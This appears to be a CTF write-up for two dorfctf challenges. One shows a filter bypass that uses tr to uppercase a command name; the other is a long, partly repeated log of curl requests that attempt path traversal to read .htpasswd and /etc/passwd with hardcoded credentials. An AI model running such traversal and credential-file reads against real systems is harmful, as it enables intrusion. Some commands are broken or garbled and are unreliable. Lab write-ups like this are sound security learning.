# dorfctf

## Challenge SuperSecureShell
10.10.0.195 - container
ssh on port 2222
inputs are filtered by a go program that runs your shell:

```
buffer = strings.ToLower(buffer)
buffer = strings.Replace(buffer, "*", "", -1)
buffer = strings.Replace(buffer, "?", "", -1)
buffer = strings.Replace(buffer, "\\", "", -1)
```
there is a go program `GETFLAG` that you need to call which is difficult
because capital letters are filtered. also the `GETFLAG` program needs a 
parameter "AGREE" to output the flag:

```
if os.Args[1] == "AGREE" {
		flag, _ := ioutil.ReadFile("/deploy/FLAG.TXT")
		println(string(flag))
		return
	}
``` 
So my solution is to use `tr`:
getflag=`echo "getflag" | tr [:lower:] [:upper:]
agree=`echo "agree" | tr [:lower:] [:upper:]`
./$getflag $agreed

### Flag:
DORF18{Y0UR_5H3LL_15_1N_4N0TH3R_C45TL3}


## PumpkinParty
10.10.0.195 has an open port 80

    nmap 10.10.1.3

    curl -iq -H 'application/x-www-form-urlencoded' -F 'merchant_count=1' http://10.10.1.3/tickets.php?action=submit

The server responds with a `Set-Cookie` header with a `PHPSESSID`.

```
curl -v -b PHPSESSID=b3ec83b80e0774419f9269dce56b45ce -v http://10.10.1.3/tickets.php?action=confirm
curl -v -b PHPSESSID=b3ec83b80e0774419f9269dce56b45ce -v http://10.10.1.3/tickets.php?action=merchant
curl -v -b PHPSESSID=b3ec83b80e0774419f9269dce56b45ce -v http://10.10.1.3/tickets.php?action=buy
curl -v -b PHPSESSID=b3ec83b80e0774419f9269dce56b45ce -v http://10.10.1.3/merchant
curl -vi http://10.10.1.3/merchants/processor.php?a=
curl -u merch_test2:BUYMYSHORTS -vi http://10.10.1.3/merchants/processor.php?a=foo
curl -u merch_test2:BUYMYSHORTS -vi http://10.10.1.3/merchants/processor.php?a=flag.txt
curl -u merch_test2:BUYMYSHORTS -vi http://10.10.1.3/merchants/processor.php?a=/etc/passwd
curl -u merch_test2:BUYMYSHORTS -vi http://10.10.1.3/merchants/processor.php?a=
curl -u merch_test2:BUYMYSHORTS -vi http://10.10.1.3/merchants/processor.php?a=flag
curl -u merch_test2:BUYMYSHORTS -vi http://10.10.1.3/merchants/processor.php?a=327a6c4304ad5938eaf0efb6cc3e53dc.php
curl -u merch_test2:BUYMYSHORTS -vi http://10.10.1.3/merchants/processor.php?a=./327a6c4304ad5938eaf0efb6cc3e53dc.php
curl -u merch_test2:BUYMYSHORTS -vi http://10.10.1.3/merchants/processor.php?b=
curl -u merch_test2:BUYMYSHORTS -vi http://10.10.1.3/merchants/processor.php?b=327a6c4304ad5938eaf0efb6cc3e53dc.php
curl -u merch_test2:BUYMYSHORTS -vi http://10.10.1.3/merchants/processor.php?b=.htaccess
curl -u merch_test2:BUYMYSHORTS -vi http://10.10.1.3/merchants/processor.php?a=.htaccess
curl -u merch_test2:BUYMYSHORTS -vi http://10.10.1.3/merchants/processor.php?a=registered
curl -u merch_test2:BUYMYSHORTS -vi http://10.10.1.3/merchants/processor.php?b=../.htaccess
curl -u merch_test2:BUYMYSHORTS -vi http://10.10.1.3/merchants/processor.php?b=../.htpasswd
curl -u merch_test2:BUYMYSHORTS -vi http://10.10.1.3/327a6c4304ad5938eaf0efb6cc3e53dc.php
curl -u merch_test2:BUYMYSHORTS -vi http://10.10.1.3/327a6c4304ad5938eaf0efb6cc3e53dc.php?admin=sure
curl -u merch_test2:BUYMYSHORTS -vi http://10.10.1.3/merchants/processor.php?b=../327a6c4304ad5938eaf0efb6cc3e53dc.php?
curl -u merch_test2:BUYMYSHORTS -vi http://10.10.1.3/merchants/processor.php?b=../327a6c4304ad5938eaf0efb6cc3e53dc.php
curl -u merch_test2:BUYMYSHORTS -vi http://10.10.1.3/merchants/processor.php?a=.
curl -u merch_test2:BUYMYSHORTS -vi http://10.10.1.3/merchants/327a6c4304ad5938eaf0efb6cc3e53dc.php?admin=surection=submit
curl -v http://10.10.1.3/tickets.php?action=buy
curl -H 'application/x-www-form-urlencoded' -F 'normal_count=1' -F 'merchant_count=1' http://10.10.1.3/tickets.php?action=submit
curl -iv -H 'application/x-www-form-urlencoded' -F 'normal_count=1' -F 'merchant_count=1' http://10.10.1.3/tickets.php?action=submit
curl -I -H 'application/x-www-form-urlencoded' -F 'normal_count=1' -F 'merchant_count=1' http://10.10.1.3/tickets.php?action=submit
curl -i -H 'application/x-www-form-urlencoded' -F 'normal_count=1' -F 'merchant_count=1' http://10.10.1.3/tickets.php?action=submit
curl -iq -H 'application/x-www-form-urlencoded' -F 'normal_count=1' -F 'merchant_count=1' http://10.10.1.3/tickets.php?action=submit
curl -v -b PHPSESSID=b1ae6268b280f9ac7106a77cd8040619 -v http://10.10.1.3/tickets.php?action=confirm
curl -v -b PHPSESSID=b1ae6268b280f9ac7106a77cd8040619 -v http://10.10.1.3/tickets.php?action=buy
curl -iq -H 'application/x-www-form-urlencoded' -F 'merchant_count=1' http://10.10.1.3/tickets.php?action=submit
curl -v -b PHPSESSID=b3ec83b80e0774419f9269dce56b45ce -v http://10.10.1.3/tickets.php?action=confirm
curl -v -b PHPSESSID=b3ec83b80e0774419f9269dce56b45ce -v http://10.10.1.3/tickets.php?action=merchant
curl -v -b PHPSESSID=b3ec83b80e0774419f9269dce56b45ce -v http://10.10.1.3/tickets.php?action=buy
curl -v -b PHPSESSID=b3ec83b80e0774419f9269dce56b45ce -v http://10.10.1.3/merchant
curl -vi http://10.10.1.3/merchants/processor.php?a=
curl -u merch_test2:BUYMYSHORTS -vi http://10.10.1.3/merchants/processor.php?a=
curl -u merch_test2:BUYMYSHORTS -vi http://10.10.1.3/merchants/processor.php?b=
curl -u merch_test2:BUYMYSHORTS -vi http://10.10.1.3/merchants/processor.php?b=327a6c4304ad5938eaf0efb6cc3e53dc.php
curl -u merch_test2:BUYMYSHORTS -vi http://10.10.1.3/merchants/processor.php?b=.htaccess
curl -u merch_test2:BUYMYSHORTS -vi http://10.10.1.3/merchants/processor.php?a=.htaccess
curl -u merch_test2:BUYMYSHORTS -vi http://10.10.1.3/merchants/processor.php?a=registered
curl -u merch_test2:BUYMYSHORTS -vi http://10.10.1.3/merchants/processor.php?b=../.htaccess
curl -u merch_test2:BUYMYSHORTS -vi http://10.10.1.3/merchants/processor.php?b=../.htpasswd
curl -u merch_test2:BUYMYSHORTS -vi http://10.10.1.3/327a6c4304ad5938eaf0efb6cc3e53dc.php
curl -u merch_test2:BUYMYSHORTS -vi http://10.10.1.3/327a6c4304ad5938eaf0efb6cc3e53dc.php?admin=sure
curl -u merch_test2:BUYMYSHORTS -vi http://10.10.1.3/merchants/processor.php?b=../327a6c4304ad5938eaf0efb6cc3e53dc.php?
curl -u merch_test2:BUYMYSHORTS -vi http://10.10.1.3/merchants/processor.php?b=../327a6c4304ad5938eaf0efb6cc3e53dc.php
curl -u merch_test2:BUYMYSHORTS -vi http://10.10.1.3/merchants/processor.php?a=.
curl -u merch_test2:BUYMYSHORTS -vi http://10.10.1.3/merchants/327a6c4304ad5938eaf0efb6cc3e53dc.php?admin=sure
```
